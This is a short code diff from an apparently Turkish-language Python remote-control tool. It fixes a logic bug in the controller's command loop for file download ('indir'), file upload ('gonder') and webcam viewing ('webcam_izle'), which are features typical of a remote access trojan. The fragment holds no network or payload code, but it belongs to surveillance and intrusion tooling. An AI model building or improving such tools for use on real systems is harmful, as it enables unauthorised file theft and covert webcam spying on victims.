@@ -43,7 +43,7 @@ while True:
         break # komut exit ise döngüyü sonlandırıyoruz.
 
     # Dosya indirme
-    if splited_command[0].lower() == "indir" or "download":
+    if splited_command[0].lower() in ["indir","download"]:
         if splited_command[1:] == "":
             dosya_ismi = input("Dosyanın lokasyonunu/adını girin: ")
         else:
@@ -74,7 +74,7 @@ while True:
         continue
 
     # Dosya gönderme
-    if splited_command[0].lower() == "gonder" or "upload":
+    if splited_command[0].lower() in ["gonder","upload"]:
         if splited_command[1:] == "":
             dosya_ismi = input("Dosyanın lokasyonunu/adını girin: ")
         else:
@@ -109,7 +109,7 @@ while True:
         
 
     # Webcam izleme
-    if command.lower() == "webcam_izle" or "webcam_start":
+    if command.lower() in ["webcam_izle","webcam_start"]:
         wdata = b""
         payload_size = struct.calcsize("Q")
         while True:
